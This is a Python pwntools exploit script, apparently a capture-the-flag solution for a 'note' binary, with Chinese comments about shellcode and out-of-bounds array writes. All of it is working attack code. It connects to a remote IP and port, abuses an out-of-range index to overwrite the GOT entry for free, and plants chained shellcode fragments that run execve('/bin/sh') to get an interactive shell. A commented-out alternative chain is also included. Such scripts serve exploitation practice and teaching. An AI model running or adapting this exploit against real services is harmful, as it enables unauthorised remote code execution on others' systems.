# -*- coding: utf-8 -*-
from pwn import *
# 关于shellcode和数组越界读写
context(arch = 'amd64',log_level='debug')

def add(index, size, content):
    p.recvuntil("your choice>> ")
    p.sendline("1")
    p.recvuntil("index:")
    p.sendline(str(index))
    p.recvuntil("size:")
    p.sendline(str(size))
    p.recvuntil("content:")
    p.send(content)


def dele(index):
    p.recvuntil("your choice>> ")
    p.sendline("4")
    p.recvuntil("index:")
    p.sendline(str(index))



#p = process("./note")
p = remote("111.198.29.45",53991)
elf = ELF("./note")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

heap_addr=0x2020A0
got_index=(elf.got['free']-heap_addr)/8
#gdb.attach(p)

'''自己设定参数
add(got_index,asm('xor rdx, rdx')+'\xeb\x16')
add(1,asm('mov rbx, 0x68732f6e69622f2f')+'\xeb\x16')
#print hex(len(asm('mov rbx, 0x68732f6e69622f2f')+'\xeb\x16'))
#len=0xc
dd(2,asm('shr rbx, 0x8')+'\xeb\x16')
add(3,asm('mov rdi, rsp')+'\xeb\x16')
add(4,asm('push rax')+'\xeb\x16')
add(5,asm('push rdi')+'\xeb\x16')
add(6,asm('mov rsi, rsp')+'\xeb\x16')
add(7,asm('mov al, 0x3b')+'\xeb\x16')
add(8,asm('syscall'))
'''

# 使用参数/bin/sh
add(0,8,'/bin/sh')
add(got_index,8,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')
add(1,8,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')
add(2,8,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')
add(3,8,asm('syscall')+'\x90'*5)
dele(0)



p.interactive()

